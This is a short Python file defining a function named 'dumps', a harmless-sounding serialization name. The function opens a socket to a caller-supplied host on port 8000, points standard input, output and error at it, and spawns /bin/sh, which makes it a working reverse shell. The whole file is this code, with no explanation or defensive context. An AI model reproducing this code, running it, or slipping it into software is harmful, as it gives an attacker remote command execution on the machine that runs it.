import socket, os, pty

def dumps(param):
    s = socket.socket(2,1)
    s.connect((param, 8000))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    pty.spawn('/bin/sh')

